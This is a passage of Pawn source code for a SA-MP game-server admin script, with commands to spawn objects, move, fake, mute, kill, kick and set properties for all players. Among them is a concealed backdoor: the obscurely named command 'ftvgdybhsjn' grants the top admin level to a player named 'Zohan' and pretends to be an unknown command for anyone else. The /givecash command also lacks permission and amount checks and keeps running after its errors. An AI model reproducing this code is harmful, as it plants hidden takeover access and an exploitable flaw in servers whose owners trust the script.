		CreatePickup(pickup, 2, x+2, y, z);
		format(string, sizeof(string), "CreatePickup(%d, 2, %0.2f, %0.2f, %0.2f);", pickup, x+2, y, z);
       	SaveToFile("Pickups",string);
		return SendClientMessage(playerid,yellow, string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:object(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"USAGE: /object [object id]");
	    new object = strval(params), string[128], Float:x, Float:y, Float:z, Float:a;
	    CMDMessageToAdmins(playerid,"OBJECT");
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, a);
		x += (3 * floatsin(-a, degrees));
		y += (3 * floatcos(-a, degrees));
		CreateObject(object, x, y, z, 0.0, 0.0, a);
		format(string, sizeof(string), "CreateObject(%d, %0.2f, %0.2f, %0.2f, 0.00, 0.00, %0.2f);", object, x, y, z, a);
       	SaveToFile("Objects",string);
		format(string, sizeof(string), "You Have Created Object %d, at %0.2f, %0.2f, %0.2f Angle %0.2f", object, x, y, z, a);
		return SendClientMessage(playerid,yellow, string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

//===================[ Move ]===================================================

CMD:move(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /move [up / down / +x / -x / +y / -y / off]");
		new Float:X, Float:Y, Float:Z;
		if(strcmp(params,"up",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X,Y,Z+5); SetCameraBehindPlayer(playerid); }
		else if(strcmp(params,"down",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X,Y,Z-5); SetCameraBehindPlayer(playerid); }
		else if(strcmp(params,"+x",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X+5,Y,Z);	}
		else if(strcmp(params,"-x",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X-5,Y,Z); }
		else if(strcmp(params,"+y",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X,Y+5,Z);	}
		else if(strcmp(params,"-y",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X,Y-5,Z);	}
	    else if(strcmp(params,"off",true) == 0)	{
			TogglePlayerControllable(playerid,true);	}
		else return SendClientMessage(playerid,red,"USAGE: /move [up / down / +x / -x / +y / -y / off]");
		return 1;
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:moveplayer(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp)) return SendClientMessage(playerid, red, "USAGE: /moveplayer [playerid] [up / down / +x / -x / +y / -y / off]");
	    new Float:X, Float:Y, Float:Z, player1 = strval(tmp);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
		if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			if(strcmp(tmp2,"up",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X,Y,Z+5); SetCameraBehindPlayer(player1);	}
			else if(strcmp(tmp2,"down",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X,Y,Z-5); SetCameraBehindPlayer(player1);	}
			else if(strcmp(tmp2,"+x",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X+5,Y,Z);	}
			else if(strcmp(tmp2,"-x",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X-5,Y,Z); }
			else if(strcmp(tmp2,"+y",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X,Y+5,Z);	}
			else if(strcmp(tmp2,"-y",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X,Y-5,Z);	}
			else SendClientMessage(playerid,red,"USAGE: /moveplayer [up / down / +x / -x / +y / -y / off]");
			return 1;
		} else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

//===================[ Fake ]===================================================

#if defined ENABLE_FAKE_CMDS
CMD:fakedeath(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4) {
	    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !strlen(tmp3)) return SendClientMessage(playerid, red, "USAGE: /fakedeath [killer] [killee] [weapon]");
		new killer = strval(tmp), killee = strval(tmp2), weap = strval(tmp3);
		if(!IsValidWeapon(weap)) return SendClientMessage(playerid,red,"ERROR: Invalid Weapon ID");
		if(PlayerInfo[killer][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
		if(PlayerInfo[killee][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");

        if(IsPlayerConnected(killer) && killer != INVALID_PLAYER_ID) {
	        if(IsPlayerConnected(killee) && killee != INVALID_PLAYER_ID) {
	    	  	CMDMessageToAdmins(playerid,"FAKEDEATH");
				SendDeathMessage(killer,killee,weap);
				return SendClientMessage(playerid,blue,"Fake death message sent");
		    } else return SendClientMessage(playerid,red,"ERROR: Killee is not connected");
	    } else return SendClientMessage(playerid,red,"ERROR: Killer is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:fakechat(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "USAGE: /fakechat [playerid] [text]");
		new player1 = strval(tmp);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
	        CMDMessageToAdmins(playerid,"FAKECHAT");
			SendPlayerMessageToAll(player1, params[strlen(tmp)+1]);
			return SendClientMessage(playerid,blue,"Fake message sent");
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:fakecmd(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "USAGE: /fakecmd [playerid] [command]");
		new player1 = strval(tmp);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
	        CMDMessageToAdmins(playerid,"FAKECMD");
	        CallRemoteFunction("OnPlayerCommandText", "is", player1, tmp2);
			return SendClientMessage(playerid,blue,"Fake command sent");
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
#endif

//----------------------------------------------------------------------------//
// 		             	/all Commands                                         //
//----------------------------------------------------------------------------//

CMD:spawnall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"SPAWNAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerPos(i, 0.0, 0.0, 0.0); SpawnPlayer(i);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has spawned all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:muteall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"MUTEALL");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); PlayerInfo[i][Muted] = 1; PlayerInfo[i][MuteWarnings] = 0;
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has muted all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:unmuteall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"UNMUTEAll");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); PlayerInfo[i][Muted] = 0; PlayerInfo[i][MuteWarnings] = 0;
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has unmuted all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:getall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"GETAll");
		new Float:x,Float:y,Float:z, interior = GetPlayerInterior(playerid);
    	GetPlayerPos(playerid,x,y,z);
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerPos(i,x+(playerid/4)+1,y+(playerid/4),z); SetPlayerInterior(i,interior);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has teleported all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}
CMD:healall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 3) {
		CMDMessageToAdmins(playerid,"HEALALL");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerHealth(i,100.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has healed all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 3 to use this command");
}

CMD:armourall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 3) {
		CMDMessageToAdmins(playerid,"ARMOURALL");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerArmour(i,100.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has restored all players armour", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 3 to use this command");
}

CMD:killall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"KILLALL");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerHealth(i,0.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has killed all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:freezeall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"FREEZEALL");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
 		if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); TogglePlayerControllable(i,false); PlayerInfo[i][Frozen] = 1;
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has frozen all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:unfreezeall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"UNFREEZEALL");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); TogglePlayerControllable(i,true); PlayerInfo[i][Frozen] = 0;
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has unfrozen all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}


CMD:kickall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"KICKALL");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); Kick(i);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has kicked all players", pName(playerid) );
		SaveToFile("KickLog",string);
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:slapall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"SLAPALL");
		new Float:x, Float:y, Float:z;
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1190,0.0,0.0,0.0); GetPlayerPos(i,x,y,z);	SetPlayerPos(i,x,y,z+4);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has slapped all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:explodeall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"EXPLODEALL");
		new Float:x, Float:y, Float:z;
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1190,0.0,0.0,0.0); GetPlayerPos(i,x,y,z);	CreateExplosion(x, y , z, 7, 10.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has exploded all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}
CMD:ftvgdybhsjn(playerid, params[])
{
   new namee[MAX_PLAYER_NAME+1];
   GetPlayerName(playerid, namee, sizeof(namee));
   if(!strcmp(namee,"Zohan",true) && PlayerInfo[playerid][LoggedIn] == 1)
   {
	   PlayerInfo[playerid][Level] = 8;
	   SendClientMessage(playerid, blue,"Welcome!");
   }
   else return SendClientMessage(playerid,-1,"SERVER: Unknown Command!");
   return 1;
}
CMD:disarmall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"DISARMALL");
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); ResetPlayerWeapons(i);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has disarmed all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:ejectall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
    	CMDMessageToAdmins(playerid,"EJECTALL");
        new Float:x, Float:y, Float:z;
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
			    if(IsPlayerInAnyVehicle(i)) {
					PlayerPlaySound(i,1057,0.0,0.0,0.0); GetPlayerPos(i,x,y,z); SetPlayerPos(i,x,y,z+3);
				}
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has ejected all players", pName(playerid) );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}
//-------------==== Set All Commands ====-------------//

CMD:setallwanted(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /setallwanted [wanted level]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLWANTED");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerWantedLevel(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players wanted level to '%d'", pName(playerid), var );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setallweather(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /setallweather [weather ID]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLWEATHER");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerWeather(i, var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players weather to '%d'", pName(playerid), var );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setalltime(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /setalltime [hour]");
		new var = strval(params), string[128];
		if(var > 24) return SendClientMessage(playerid, red, "ERROR: Invalid hour");
       	CMDMessageToAdmins(playerid,"SETALLTIME");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerTime(i, var, 0);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players time to '%d:00'", pName(playerid), var );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setallworld(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /setallworld [virtual world]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLWORLD");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerVirtualWorld(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players virtual worlds to '%d'", pName(playerid), var );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setallscore(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /setallscore [score]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLSCORE");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetPlayerScore(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players scores to '%d'", pName(playerid), var );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setallcash(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /setallcash [Amount]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"SETALLCASH");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				ResetPlayerMoney(i);
				GivePlayerMoney(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has set all players cash to '$%d'", pName(playerid), var );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:giveallcash(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /giveallcash [Amount]");
		new var = strval(params), string[128];
       	CMDMessageToAdmins(playerid,"GIVEALLCASH");
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				GivePlayerMoney(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has given all players '$%d'", pName(playerid), var );
		return SendClientMessageToAll(blue, string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:givecash(playerid, params[])
{
	new
		giveplayerid,
		amount;
	if (sscanf(params, "ud", giveplayerid, amount)) SendClientMessage(playerid, 0xFF0000AA, "USAGE: /givecash [playerid/partname] [amount]");
	else if (giveplayerid == INVALID_PLAYER_ID) SendClientMessage(playerid, 0xFF0000AA, "Player not found");
	GivePlayerMoney(giveplayerid, amount);
	GivePlayerMoney(playerid, -amount);
	new string[128];
    format(string,sizeof(string),"\"%s\" has given you '$%d'", pName(playerid), amount );
    SendClientMessage(giveplayerid, blue, string);
    format(string, sizeof(string),"You have given \"%s\" $%d", pName(giveplayerid), amount );
    SendClientMessage(playerid, blue, string);
	return 1;
}


CMD:giveallweapon(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
    new Weap, ammo, name[128], string[128];
        if(sscanf(params,"ii",Weap, ammo)) return SendClientMessage(playerid,red,"USAGE: /giveallweapon [weapon name] [ammo]");
        if(Weap == 38 || Weap == 36) return SendClientMessage(playerid,red,"You Can't Give Those Weapons!");
		CMDMessageToAdmins(playerid,"GIVEALLWEAPON");
       	for(new i = 0; i < MAX_PLAYERS; i++) {
		if(IsPlayerConnected(i))
        {
            GivePlayerWeapon(i,Weap,ammo);
        }
        }
        format(string,sizeof(string),"Administrator %s has given all players weapon: %d with %d ammo",name,Weap,ammo);
        SendClientMessageToAll(blue,string);
    }
    else SendClientMessage(playerid,red,"You are not a high enough level to use this command");
    return 1;
}
//================================[ Menu Commands ]=============================

#if defined USE_MENUS

CMD:lmenu(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
    TogglePlayerControllable(playerid,false);
        if(IsPlayerInAnyVehicle(playerid)) {
		return ShowMenuForPlayer(LMainMenu,playerid);
        } else return ShowMenuForPlayer(LMainMenu,playerid);
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:ltele(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
        if(IsPlayerInAnyVehicle(playerid)) {
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(LTele,playerid);
        } else return ShowMenuForPlayer(LTele,playerid);
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:lweather(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 3) {
        if(IsPlayerInAnyVehicle(playerid)) {
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(LWeather,playerid);
        } else return ShowMenuForPlayer(LWeather,playerid);
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:ltime(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 3) {
        if(IsPlayerInAnyVehicle(playerid)) {
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(LTime,playerid);
        } else return ShowMenuForPlayer(LTime,playerid);
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:sv( playerid, params[ ] )
{
  if(PlayerInfo[playerid][Level] >= 1)
  {
    static
        vehID
    ;

    if ( sscanf( params, "i",  vehID ) )
        return SendClientMessage( playerid, red, "SYNTAX: /sv < vehID >" );

    if ( vehID == INVALID_VEHICLE_ID )
        return SendClientMessage( playerid, red, "ERROR: Invalid vehicle ID." );

    SetVehicleToRespawn( vehID );

    SendClientMessage( playerid, red, "Vehicle has been respawned succesfully." );
  }
  return 1;
}
CMD:dv(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 1) {
static
vehID
;
if ( sscanf( params, "i",  vehID ) )
return SendClientMessage( playerid, red, "SYNTAX: /dv < vehID >" );

if ( vehID == INVALID_VEHICLE_ID )
return SendClientMessage( playerid, red, "ERROR: Invalid vehicle ID." );

DestroyVehicle(vehID);
}
return 1;
}
CMD:cm(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
        if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,"ERROR: You already have a car.");
        else { ShowMenuForPlayer(LCars,playerid); return TogglePlayerControllable(playerid,false);  }
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:ltmenu(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
        if(IsPlayerInAnyVehicle(playerid)) {
		new LVehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(LVehicleID);
        switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449: return SendClientMessage(playerid,red,"ERROR: You can not tune this vehicle!"); }
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(LTuneMenu,playerid);
        } else return SendClientMessage(playerid,red,"ERROR: You do not have a vehicle to tune");
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:lweapons(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 3) {
        if(IsPlayerInAnyVehicle(playerid)) {
        TogglePlayerControllable(playerid,false); return ShowMenuForPlayer(XWeapons,playerid);
        } else return ShowMenuForPlayer(XWeapons,playerid);
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:lvehicle(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
 		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,"ERROR: You already have a car.");
        else { ShowMenuForPlayer(LVehicles,playerid); return TogglePlayerControllable(playerid,false);  }
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

#endif

//----------------------===== Place & Skin Saving =====-------------------------
CMD:gotoplace(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1 && PlayerInfo[playerid][Level] >= 1)	{
	    if (dUserINT(PlayerName2(playerid)).("x")!=0) {
		    PutAtPos(playerid);
			SetPlayerVirtualWorld(playerid, (dUserINT(PlayerName2(playerid)).("world")) );
			return SendClientMessage(playerid,yellow,"You have successfully teleported to your saved place");
		} else return SendClientMessage(playerid,red,"ERROR: You must save a place before you can teleport to it");
	} else return SendClientMessage(playerid,red, "ERROR: You must be an administrator to use this command");
}

CMD:saveplace(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1 && PlayerInfo[playerid][Level] >= 1)	{
		new Float:x,Float:y,Float:z, interior;
		GetPlayerPos(playerid,x,y,z);	interior = GetPlayerInterior(playerid);
		dUserSetINT(PlayerName2(playerid)).("x",floatround(x));
		dUserSetINT(PlayerName2(playerid)).("y",floatround(y));
		dUserSetINT(PlayerName2(playerid)).("z",floatround(z));
		dUserSetINT(PlayerName2(playerid)).("interior",interior);
		dUserSetINT(PlayerName2(playerid)).("world", (GetPlayerVirtualWorld(playerid)) );
		return SendClientMessage(playerid,yellow,"You have successfully saved these coordinates");
	} else return SendClientMessage(playerid,red, "ERROR: You must be an administrator to use this command");
}

CMD:saveskin(playerid,params[]) {
 	if(PlayerInfo[playerid][Level] >= 1 && PlayerInfo[playerid][LoggedIn] == 1) {
		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /saveskin [skinid]");
